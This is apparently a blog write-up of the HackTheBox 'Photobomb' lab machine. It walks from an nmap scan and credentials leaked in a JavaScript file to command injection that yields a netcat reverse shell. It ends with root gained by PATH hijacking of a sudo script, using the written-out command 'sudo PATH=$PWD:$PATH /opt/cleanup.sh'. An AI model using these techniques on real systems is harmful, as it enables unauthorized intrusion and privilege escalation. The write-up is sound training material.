---
title: <img width="50" height="50" alt="photobomb"  src="https://user-images.githubusercontent.com/95465072/209364309-5c18410b-a7eb-41f6-bdc0-a1c0a6f8f9f4.png"> Photobomb | HackTheBox | Machine
date: 2022-12-12 00:00:02 +240
categories: [Write Up, HackTheBox]
tags: [write up, hackthebox, ctf, easy, walkthrough, web, http, photobomb,burpsuite, ssh, injection,  machine] # TAG names should always be lowercase


---


-------------------
<img width="586" alt="photobomb" src="https://user-images.githubusercontent.com/95465072/209364697-04ba14f4-3dac-46f0-a343-5a48bbfaac5a.png">


## Enumeration

### Nmap
```sh
nmap -sV -sC <target ip>
```
```
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-10 10:47 EST
Nmap scan report for 10.10.11.182
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.36 seconds

```

### Let's see port 80 

<img width="490" alt="80" src="https://user-images.githubusercontent.com/95465072/209364754-3cb16d3f-0a3f-408f-b029-40cfaf8aa263.png">


and by inspecting and by looking into source code of the page we found ```photobomb.js```

![view page source](https://user-images.githubusercontent.com/95465072/209364868-0960afa3-9569-43d8-869b-a77c3848f1cc.png)


Let's see what's there in the **photobomb.js**

<img width="518" alt="pass-link" src="https://user-images.githubusercontent.com/95465072/209364894-b5cda189-fb84-46e2-ae25-437af762fe6e.png">


we got the special url that is ```http://pH0t0:b0Mb!@photobomb.htb/printer```


### now we logged in as pH0t0

<img width="811" alt="download image" src="https://user-images.githubusercontent.com/95465072/209364922-64403d61-2d17-4f25-9fcb-7662932cbc58.png">


we can see that we can download the images! let's intercept that using burpsuite!


<img width="367" alt="burp-intercept--download" src="https://user-images.githubusercontent.com/95465072/209364971-4c6ce9ef-3584-4cc4-9a92-0c371f51cd4f.png">


By looking at the intercepted request we can see that we can we can take leverage of injection functionality here!

try with the reverse shell !
visit here to generate reverseshell ```https://revshells.com/```

<img width="865" alt="payload" src="https://user-images.githubusercontent.com/95465072/209365007-3e468ac4-3c7d-4f08-aa1f-7a2a5951a9a8.png">

### It's importent to encode the payload to urlencode


<img width="499" alt="encode-payload" src="https://user-images.githubusercontent.com/95465072/209365053-c4c9850d-d9e9-46e5-8bf7-c547b7a9787a.png">

&nbsp;
&nbsp;

<img width="497" alt="shell-getting-burp" src="https://user-images.githubusercontent.com/95465072/209367562-c9c94d85-eea0-4735-b5ed-80d220179f68.png">







## we got a reverse shell!


```
❯ sudo netcat -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.182
wizard@photobomb:~/photobomb$ id
uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)
wizard@photobomb:~/photobomb$ hostname -I
10.10.11.182 dead:beef::250:56ff:feb9:240a 
wizard@photobomb:~/photobomb$ cat ../user.txt 
c00**************************1d8
wizard@photobomb:~/photobomb$
```

## Privilege Escalation

By looking at the sudoers we can see that we can run a script, but we also have the ability to set environment variables

```
wizard@photobomb:~$ sudo -l
Matching Defaults entries for wizard on photobomb:
    secure_path=/usr/local/bin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
wizard@photobomb:~$
```

Looking at the script we can see that it uses find relatively and not the absolute path

```
wizard@photobomb:~$ cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
wizard@photobomb:~$

```

We can take advantage of the fact that we can change variables like the path so that it takes us a custom find command, and in the context of sudo our find will run as root

# Congragulations!

this is the command that gives you the root privileges ```sudo PATH=$PWD:$PATH /opt/cleanup.sh```

```
wizard@photobomb:~$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
root@photobomb:~# id
uid=0(root) gid=0(root) groups=0(root)
root@photobomb:~# hostname -I
10.10.11.182 dead:beef::250:56ff:feb9:240a 
root@photobomb:~# cat /root/root.txt 
344**************************a18
root@photobomb:~#
```
